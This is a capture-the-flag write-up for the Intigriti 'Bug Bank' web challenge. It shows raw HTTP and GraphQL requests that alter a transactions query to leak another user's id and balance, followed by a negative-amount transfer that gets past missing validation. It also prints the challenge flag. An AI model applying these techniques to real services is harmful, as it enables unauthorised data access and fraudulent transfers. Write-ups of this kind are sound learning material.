# Bug Bank [158 Solves]

## Description

> Welcome to BugBank, the world's premier banking application for trading bugs! In this new era, bugs are more valuable than gold, and we have built the ultimate platform for you to handle your buggy assets. Trade enough bugs and you have the chance to become a premium member. And in case you have any questions, do not hesitate to contact your personal assistant. Happy trading!
>
> Author: fhantke
>
> <https://bugbank.ctf.intigriti.io> || <https://bugbank2.ctf.intigriti.io>

No attachments.

## Flag

INTIGRITI{h3y_wh0_541d_y0u_c0uld_cl0bb3r_7h3_d0m}

## Solution

Looking at this web application, found the Upgrade feature.

![Bug_Bank_upgrade.png](img/Bug_Bank_upgrade.png)

I should upgrade to get the flag, but this requires to 10,000 bugs (amounts).

![Bug_Bank_home.png](img/Bug_Bank_home.png)

No bugs so I see if I can increase bugs to upgrade.

### Step1: Leak yourname__personal_support user's id by GraphQL transactions Query

Accessed `/home` URL path, the following request is sent.

```text
POST /graphql HTTP/2
Host: bugbank.ctf.intigriti.io
Content-Length: 371
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYTBmMDVhN2UtYTc0Yy00MGYwLTk5YTEtYTg5NjNmNWZlMjcxIn0.2yqwRVD8Cmpks-tRm02fg2gVePeluxAmMwi03SROBJQ
Content-Type: application/json

{"operationName":"transactions","variables":{},"query":"query transactions {\n  transactions {\n    success\n    errors\n    transactions {\n      id\n      sender {\n        name\n        __typename\n      }\n      recipient {\n        name\n        __typename\n      }\n      amount\n      description\n      timestamp\n      __typename\n    }\n    __typename\n  }\n}"}
```

Beautified GraphQL Query:

```graphql
query transactions {
  transactions {
    success
    errors
    transactions {
      id
      sender {
        name
        __typename
      }
      recipient {
        name
        __typename
      }
      amount
      description
      timestamp
      __typename
    }
    __typename
  }
}
```

append id field to sender and remove unnecessary fields:

```graphql
query transactions {
  transactions {
    transactions {
      sender {
        id
        name
        money
        __typename
      }
    }
  }
}
```

re-send request:

```text
POST /graphql HTTP/2
Host: bugbank.ctf.intigriti.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYTBmMDVhN2UtYTc0Yy00MGYwLTk5YTEtYTg5NjNmNWZlMjcxIn0.2yqwRVD8Cmpks-tRm02fg2gVePeluxAmMwi03SROBJQ
Content-Type: application/json
Content-Length: 147

{"operationname": "transactions","variables":{},"query":"query transactions {transactions {transactions {sender {id name money __typename}}}}"}
```

```text
HTTP/2 200 OK
Date: Mon, 20 Nov 2023 05:17:59 GMT
Content-Type: application/json
Content-Length: 169
Access-Control-Allow-Origin: *
Vary: Cookie
Strict-Transport-Security: max-age=15724800; includeSubDomains

{"data":{"transactions":{"transactions":[{"sender":{"__typename":"User","id":"5595cab6-3a55-477b-b77d-cfa6f3bf6623","money":47532,"name":"test02_personal_support"}}]}}}
```

Got personal_support id 5595cab6-3a55-477b-b77d-cfa6f3bf6623.
Additionally, personal_support user has 47532 money.

### Step2: Transfer Bugs to yourname_personal_support user with -10000 amount

Since there is no validation for the amount when transfer bugs, I can transfer a negative value.

![Bug_Bank_transfer.png](img/Bug_Bank_transfer.png)

![Bug_Bank_got_10000_bugs.png](img/Bug_Bank_got_10000_bugs.png)

### Step3: Upgrade

![Bug_Bank_flag.png](img/Bug_Bank_flag.png)

Got the flag.
